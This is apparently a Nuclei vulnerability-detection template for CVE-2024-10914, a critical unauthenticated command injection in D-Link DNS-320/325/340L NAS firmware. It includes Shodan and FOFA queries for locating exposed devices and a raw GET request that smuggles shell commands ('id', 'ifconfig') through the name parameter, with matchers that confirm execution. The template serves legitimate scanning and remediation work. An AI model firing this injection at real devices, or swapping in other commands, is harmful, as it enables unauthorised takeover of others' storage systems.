id: CVE-2024-10914

info:
  name: D-Link NAS - Command Injection via Name Parameter
  author: s4e-io
  severity: critical
  description: |
    A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and DNS-340L up to 20241028. It has been declared as critical. Affected by this vulnerability is the function cgi_user_add of the file /cgi-bin/account_mgr.cgi?cmd=cgi_user_add. The manipulation of the argument name leads to os command injection.
  impact: |
    Unauthenticated attackers can execute arbitrary OS commands via the name parameter, potentially compromising the entire D-Link NAS device.
  remediation: |
    Update D-Link DNS-320, DNS-320LW, DNS-325, and DNS-340L firmware to versions released after 20241028.
  reference:
    - https://github.com/verylazytech/CVE-2024-10914
    - https://www.usom.gov.tr/bildirim/tr-24-1836
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10914
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10914
    cwe-id: CWE-707
    epss-score: 0.93814
    epss-percentile: 0.99852
    cpe: cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dns-320_firmware
    shodan-query: http.html:"sharecenter"
    fofa-query: body="sharecenter"
  tags: cve,cve2024,dlink,sharecenter,rce,vkev,vuln

http:
  - raw:
      - |
        GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{{command}};%27 HTTP/1.1
        Host: {{Hostname}}

    payloads:
      command:
        - "id"
        - "ifconfig"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)"
          - "contains_all(body, 'inet addr:', 'Mask:')"
        condition: or

      - type: dsl
        dsl:
          - 'contains(body, "Content-type: text/html")'
          - "status_code == 200"
        condition: and
# digest: 490a0046304402202131cab38a3ef4346e9d5e4d315b38cd541604c8e9e628088b9ae491c7acf3f802206fdcb3e427556dacb88ccc7da2d3c50ba69b83bacec307b3dfbe6ecd61cd1ff5:922c64590222798bb761d5b6d8e72950